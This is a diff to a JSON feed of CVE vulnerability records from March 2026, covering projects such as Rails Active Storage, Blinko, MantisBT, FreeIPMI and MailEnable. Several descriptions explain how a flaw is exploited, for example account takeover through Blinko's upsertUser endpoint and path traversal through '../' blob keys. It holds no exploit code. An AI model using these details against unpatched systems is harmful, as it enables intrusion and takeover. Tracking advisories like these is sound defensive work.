+      "description": "Integer Overflow or Wraparound vulnerability in InsightSoftwareConsortium ITK (‎Modules/ThirdParty/Expat/src/expat modules).This issue affects ITK: before 2.7.1.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/InsightSoftwareConsortium/ITK/pull/5351",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "InsightSoftwareConsortium",
+          "product": "ITK",
+          "collectionURL": "https://github.com/InsightSoftwareConsortium/ITK",
+          "modules": [
+            "‎Modules/ThirdParty/Expat/src/expat"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.7.1",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-190 Integer Overflow or Wraparound"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4738",
+      "publishedDate": "2026-03-24T03:18:10.245Z",
+      "lastModifiedDate": "2026-03-24T14:35:23.904Z",
+      "description": "Improper Restriction of Operations within the Bounds of a Memory Buffer vulnerability in OSGeo gdal (frmts/zlib/contrib/infback9 modules). This vulnerability is associated with program files inftree9.C‎.\n\nThis issue affects gdal: before 3.11.0.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/OSGeo/gdal/pull/12244",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "OSGeo",
+          "product": "gdal",
+          "collectionURL": "https://github.com/OSGeo/gdal",
+          "modules": [
+            "frmts/zlib/contrib/infback9"
+          ],
+          "programFiles": [
+            "inftree9.c‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "3.11.0",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4737",
+      "publishedDate": "2026-03-24T03:16:22.292Z",
+      "lastModifiedDate": "2026-03-24T14:35:46.646Z",
+      "description": "Use After Free vulnerability in No-Chicken Echo-Mate (‎SDK/rv1106-sdk/sysdrv/source/kernel/mm modules). This vulnerability is associated with program files rmap.C‎.\n\nThis issue affects Echo-Mate: before V250329.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/No-Chicken/Echo-Mate/pull/9",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "No-Chicken",
+          "product": "Echo-Mate",
+          "collectionURL": "https://github.com/No-Chicken/Echo-Mate",
+          "modules": [
+            "‎SDK/rv1106-sdk/sysdrv/source/kernel/mm"
+          ],
+          "programFiles": [
+            "rmap.c‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "V250329",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-416 Use After Free"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4736",
+      "publishedDate": "2026-03-24T03:11:16.951Z",
+      "lastModifiedDate": "2026-03-24T14:36:13.673Z",
+      "description": "Improper Handling of Values vulnerability in No-Chicken Echo-Mate (SDK/rv1106-sdk/sysdrv/source/kernel/include/net/netfilter modules). This vulnerability is associated with program files nf_tables.H‎, nft_byteorder.C‎, nft_meta.C‎.\n\nThis issue affects Echo-Mate: before V250329.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/No-Chicken/Echo-Mate/pull/8",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "No-Chicken",
+          "product": "Echo-Mate",
+          "collectionURL": "https://github.com/No-Chicken/Echo-Mate",
+          "modules": [
+            "SDK/rv1106-sdk/sysdrv/source/kernel/include/net/netfilter"
+          ],
+          "programFiles": [
+            "nf_tables.h‎",
+            "nft_byteorder.c‎",
+            "nft_meta.c‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "V250329",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-229 Improper Handling of Values"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4735",
+      "publishedDate": "2026-03-24T03:08:18.156Z",
+      "lastModifiedDate": "2026-03-24T14:36:43.076Z",
+      "description": "Deserialization of Untrusted Data vulnerability in DTStack chunjun (‎chunjun-core/src/main/java/com/dtstack/chunjun/util modules). This vulnerability is associated with program files GsonUtil.Java.\n\nThis issue affects chunjun: before 1.16.1.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/DTStack/chunjun/pull/1939",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "DTStack",
+          "product": "chunjun",
+          "collectionURL": "https://github.com/DTStack/chunjun",
+          "modules": [
+            "‎chunjun-core/src/main/java/com/dtstack/chunjun/util"
+          ],
+          "programFiles": [
+            "GsonUtil.java"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "1.16.1",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-502 Deserialization of Untrusted Data"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-30662",
+      "publishedDate": "2026-03-24T00:00:00.000Z",
+      "lastModifiedDate": "2026-03-24T14:19:16.045Z",
+      "description": "ConcreteCMS v9.4.7 contains a Denial of Service (DoS) vulnerability in the File Manager component. The 'download' method in 'concrete/controllers/backend/file.php' improperly manages memory when creating zip archives. It uses 'ZipArchive::addFromString' combined with 'file_get_contents', which loads the entire content of every selected file into PHP memory. An authenticated attacker can exploit this by requesting a bulk download of large files, triggering an Out-Of-Memory (OOM) condition that causes the PHP-FPM process to terminate (SIGSEGV) and the web server to return a 500 error.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://wang1rrr.github.io/2026/02/11/CVE-Report-ConcreteCMS-DoS/",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "n/a",
+          "product": "n/a",
+          "versions": [
+            {
+              "version": "n/a",
               "status": "affected"
             }
           ]
         }
       ],
       "problemType": [
-        "Sensitive Information in Resource Not Removed Before Reuse"
+        "n/a"
       ],
       "fix_suggestion": "无法生成修复建议"
     },
     {
-      "id": "CVE-2026-33311",
-      "publishedDate": "2026-03-24T13:23:43.289Z",
-      "lastModifiedDate": "2026-03-24T13:23:43.289Z",
-      "description": "DiceBear is an avatar library for designers and developers. Starting in version 5.0.0 and prior to versions 5.4.4, 6.1.4, 7.1.4, 8.0.3, and 9.4.1, SVG attribute values derived from user-supplied options (`backgroundColor`, `fontFamily`, `textColor`) were not XML-escaped before interpolation into SVG output. This could allow Cross-Site Scripting (XSS) when applications pass untrusted input to `createAvatar()` and serve the resulting SVG inline or with `Content-Type: image/svg+xml`. Starting in versions 5.4.4, 6.1.4, 7.1.4, 8.0.3, and 9.4.1, all affected SVG attribute values are properly escaped using XML entity encoding. Users should upgrade to the listed patched versions. Some mitigating factors limit vulnerability. Applications that validate input against the library's JSON Schema before passing it to `createAvatar()` are not affected. The DiceBear CLI validates input via AJV and was not vulnerable. Exploitation requires that an application passes untrusted, unvalidated external input directly as option values.",
-      "severity": 4.7,
+      "id": "CVE-2026-33554",
+      "publishedDate": "2026-03-24T00:00:00.000Z",
+      "lastModifiedDate": "2026-03-24T14:05:40.956Z",
+      "description": "ipmi-oem in FreeIPMI before 1.16.17 has exploitable buffer overflows on response messages. The Intelligent Platform Management Interface (IPMI) specification defines a set of interfaces for platform management. It is implemented by a large number of hardware manufacturers to support system management. It is most commonly used for sensor reading (e.g., CPU temperatures through the ipmi-sensors command within FreeIPMI) and remote power control (the ipmipower command). The ipmi-oem client command implements a set of a IPMI OEM commands for specific hardware vendors. If a user has supported hardware, they may wish to use the ipmi-oem command to send a request to a server to retrieve specific information. Three subcommands were found to have exploitable buffer overflows on response messages. They are: \"ipmi-oem dell get-last-post-code - get the last POST code and string describing the error on some Dell servers,\" \"ipmi-oem supermicro extra-firmware-info - get extra firmware info on Supermicro servers,\" and \"ipmi-oem wistron read-proprietary-string - read a proprietary string on Wistron servers.\"",
+      "severity": "N/A",
       "references": [
         {
-          "url": "https://github.com/dicebear/dicebear/security/advisories/GHSA-mr9r-mww3-v6gv",
+          "url": "https://savannah.gnu.org/bugs/?68140",
+          "type": "reference"
+        },
+        {
+          "url": "https://savannah.gnu.org/bugs/?68141",
+          "type": "reference"
+        },
+        {
+          "url": "https://savannah.gnu.org/bugs/?68142",
+          "type": "reference"
+        },
+        {
+          "url": "https://ftp.gnu.org/gnu/freeipmi/",
           "type": "reference"
         }
       ],
       "affected": [
         {
-          "vendor": "dicebear",
-          "product": "dicebear",
+          "vendor": "n/a",
+          "product": "n/a",
           "versions": [
             {
-              "version": ">= 5.0.0, < 5.4.4",
+              "version": "n/a",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "n/a"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-30661",
+      "publishedDate": "2026-03-24T00:00:00.000Z",
+      "lastModifiedDate": "2026-03-24T14:32:06.267Z",
+      "description": "iCMS v8.0.0 contains a Cross-Site Scripting (XSS) vulnerability in the User Management component, specifically within the index.html file. This allows remote attackers to execute arbitrary web script or HTML via the regip or loginip parameters.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://wang1rrr.github.io/2026/02/09/CVE-Report-iCMS-v8.0.0-XSS/",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "n/a",
+          "product": "n/a",
+          "versions": [
+            {
+              "version": "n/a",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "n/a"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33195",
+      "publishedDate": "2026-03-23T23:31:41.785Z",
+      "lastModifiedDate": "2026-03-24T14:11:19.263Z",
+      "description": "Active Storage allows users to attach cloud and local files in Rails applications. Prior to versions 8.1.2.1, 8.0.4.1, and 7.2.3.1, Active Storage's `DiskService#path_for` does not validate that the resolved filesystem path remains within the storage root directory. If a blob key containing path traversal sequences (e.g. `../`) is used, it could allow reading, writing, or deleting arbitrary files on the server. Blob keys are expected to be trusted strings, but some applications could be passing user input as keys and would be affected. Versions 8.1.2.1, 8.0.4.1, and 7.2.3.1 contain a patch.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/rails/rails/security/advisories/GHSA-9xrj-h377-fr87",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/commit/4933c1e3b8c1bb04925d60347be9f69270392f2c",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/commit/9b06fbc0f504b8afe333f33d19548f3b85fbe655",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/commit/a290c8a1ec189d793aa6d7f2570b6a763f675348",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/releases/tag/v7.2.3.1",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/releases/tag/v8.0.4.1",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/rails/rails/releases/tag/v8.1.2.1",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "rails",
+          "product": "activestorage",
+          "versions": [
+            {
+              "version": ">= 8.1.0.beta1, < 8.1.2.1",
               "status": "affected"
             },
             {
-              "version": ">= 6.0.0, < 6.1.4",
+              "version": ">= 8.0.0.beta1, < 8.0.4.1",
               "status": "affected"
             },
             {
-              "version": ">= 7.0.0, < 7.1.4",
+              "version": "< 7.2.3.1",
               "status": "affected"
-            },
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-23486",
+      "publishedDate": "2026-03-23T20:42:24.689Z",
+      "lastModifiedDate": "2026-03-24T14:07:26.774Z",
+      "description": "Blinko is an AI-powered card note-taking project. Prior to version 1.8.4, a publicly accessible endpoint exposes all user information, including usernames, roles, and account creation dates. This issue has been patched in version 1.8.4.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/blinkospace/blinko/security/advisories/GHSA-446p-2xf5-frxf",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/blinkospace/blinko/commit/ec1e3e20384b620b8bf928fe80b4d8546757b419",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/blinkospace/blinko/releases/tag/1.8.4",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "blinkospace",
+          "product": "blinko",
+          "versions": [
             {
-              "version": ">= 8.0.0, < 8.0.3",
+              "version": "< 1.8.4",
               "status": "affected"
-            },
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-23480",
+      "publishedDate": "2026-03-23T20:39:38.784Z",
+      "lastModifiedDate": "2026-03-24T14:08:24.272Z",
+      "description": "Blinko is an AI-powered card note-taking project. Prior to version 1.8.4, there is a privilege escalation vulnerability. The upsertUser endpoint has 3 issues: it is missing superAdminAuthMiddleware, any logged-in user can call it; the originalPassword is an optional parameter and if not provided password verification is skipped; there is no check for input.id === ctx.id (ownership verification). This could result in any authenticated user modifying other users' passwords, direct escalation to superadmin, and complete account takeover. This issue has been patched in version 1.8.4.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/blinkospace/blinko/security/advisories/GHSA-r3mv-q7ww-86p6",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/blinkospace/blinko/commit/3afbdf486b6f371bdac5781dea6289749f2c4c03",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/blinkospace/blinko/releases/tag/1.8.4",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "blinkospace",
+          "product": "blinko",
+          "versions": [
             {
-              "version": ">= 9.0.0, < 9.4.1",
+              "version": "< 1.8.4",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-288: Authentication Bypass Using an Alternate Path or Channel"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33517",
+      "publishedDate": "2026-03-23T19:13:15.220Z",
+      "lastModifiedDate": "2026-03-24T14:17:15.295Z",
+      "description": "Mantis Bug Tracker (MantisBT) is an open source issue tracker. In version 2.28.0, when deleting a Tag (tag_delete.php), improper escaping of its name when displaying the confirmation message allows an attacker to inject HTML and, if CSP settings permit, achieve execution of arbitrary JavaScript. Version 2.28.1 fixes the issue. Workarounds include reverting commit d6890320752ecf37bd74d11fe14fe7dc12335be9 and/or manually editing language files to remove the sprintf placeholder `%1$s` from `$s_tag_delete_message` string.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/mantisbt/mantisbt/security/advisories/GHSA-fh48-f69w-7vmp",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/mantisbt/mantisbt/commit/80990f43153167c73f11eb4b2bc7108d0c3d6b46",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/mantisbt/mantisbt/commit/d6890320752ecf37bd74d11fe14fe7dc12335be9",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "mantisbt",
+          "product": "mantisbt",
+          "versions": [
+            {
+              "version": "= 2.28.0",
               "status": "affected"
             }
           ]
@@ -761,31 +2812,50 @@
       "fix_suggestion": "无法生成修复建议"
     },
     {
-      "id": "CVE-2026-33497",
-      "publishedDate": "2026-03-24T13:14:39.647Z",
-      "lastModifiedDate": "2026-03-24T13:14:39.647Z",
-      "description": "Langflow is a tool for building and deploying AI-powered agents and workflows. Prior to version 1.7.1, in the download_profile_picture function of the /profile_pictures/{folder_name}/{file_name} endpoint, the folder_name and file_name parameters are not strictly filtered, which allows the secret_key to be read across directories. Version 1.7.1 contains a patch.",
+      "id": "CVE-2026-32850",
+      "publishedDate": "2026-03-23T19:06:09.045Z",
+      "lastModifiedDate": "2026-03-24T14:21:43.953Z",
+      "description": "MailEnable versions prior to 10.55 contain a reflected cross-site scripting vulnerability in the webmail interface that allows remote attackers to execute arbitrary JavaScript in a victim's browser by crafting a malicious URL. Attackers can inject malicious code through the SelectedIndex parameter in the ManageShares.aspx form, which is not properly sanitized before being embedded into dynamically generated JavaScript.",
       "severity": "N/A",
       "references": [
         {
-          "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-ph9w-r52h-28p7",
+          "url": "https://www.mailenable.com/rss/article.asp?Source=RSSADMIN&ID=MAILENABLEVERSION1055",
+          "type": "reference"
+        },
+        {
+          "url": "https://karmainsecurity.com/KIS-2026-05",
+          "type": "poc"
+        },
+        {
+          "url": "https://mailenable.com/Standard-ReleaseNotes.txt",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.mailenable.com/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/mailenable-reflected-xss-via-manageshares-aspx-selectedindex-parameter",
           "type": "reference"
         }
       ],
       "affected": [
         {
-          "vendor": "langflow-ai",
-          "product": "langflow",
+          "vendor": "MailEnable",
+          "product": "MailEnable",
           "versions": [
             {
-              "version": "< 1.7.1",
-              "status": "affected"
+              "status": "affected",
+              "version": "0",
+              "lessThan": "10.55",
+              "versionType": "semver"
             }
-          ]
+          ],
+          "defaultStatus": "unaffected"
         }
       ],
       "problemType": [
-        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        "CWE-79 Improper neutralization of input during web page generation ('cross-site scripting')"
       ],
       "fix_suggestion": "无法生成修复建议"
     }
